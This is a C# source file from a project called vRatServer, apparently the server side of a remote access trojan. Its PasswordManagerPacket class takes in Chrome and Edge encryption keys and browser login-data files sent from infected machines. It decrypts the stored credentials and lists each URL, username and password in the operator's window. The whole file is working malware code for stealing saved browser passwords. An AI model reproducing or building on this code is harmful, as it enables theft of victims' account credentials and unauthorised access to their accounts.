using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using vRatServer.Classes;
using vRatServer.Forms;

namespace vRatServer.Packets
{
    class PasswordManagerPacket
    {
        static byte[] keyChrome = new byte[32];
        static byte[] keyEdge = new byte[32];
        Client client;
        void setChromeKey(byte[] data)
        {
            keyChrome = data;
        }
        private static string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(chars, length)
                              .Select(s => s[new Random().Next(s.Length)]).ToArray());
        }
        void setEdgKey(byte[] data)
        {
            keyEdge = data;
        }

        void gePassFFile(byte[] logindata,byte com)
        {
            byte[] r = keyChrome;
            if (com == (byte)globals.PacketType.edglogfile) { r = keyEdge; }
            string filename = GenerateRandomString(7);  
            File.WriteAllBytes(filename, logindata);
            var pwds = PasswordManager.ExtractSavedLogins(filename, r);
            string logs="";
            foreach(var log in pwds)
            {
                if(log.Url=="" && log.Username=="" && log.Password == "") { continue; }
                logs += "URL:" + log.Url + "  USERNAME :  " + log.Username + "   PASSWORD :  " + log.Password + Environment.NewLine;
            }
            Program.f1.BeginInvoke((MethodInvoker)delegate
            {
                if (client.pam != null)
                {
                    //add logs
                    if(com== (byte)globals.PacketType.edglogfile) { client.pam.AddEdgLogs(logs); }
                    else { client.pam.AddChromeLogs(logs); }
                }

            });

        }
        public PasswordManagerPacket(Client client, byte[] data, byte com)
        {
            this.client = client;
            switch (com)
            {
                case (byte)globals.PacketType.chromekey:
                    setChromeKey(data);
                    break;
                case (byte)globals.PacketType.edgkey:
                    setEdgKey(data);
                    break;
                case (byte)globals.PacketType.edglogfile:
                case (byte)(byte)globals.PacketType.chromelogfile:
                    gePassFFile(data, com);
                    break;
                default:
                    break;

            }
        }
    }
}
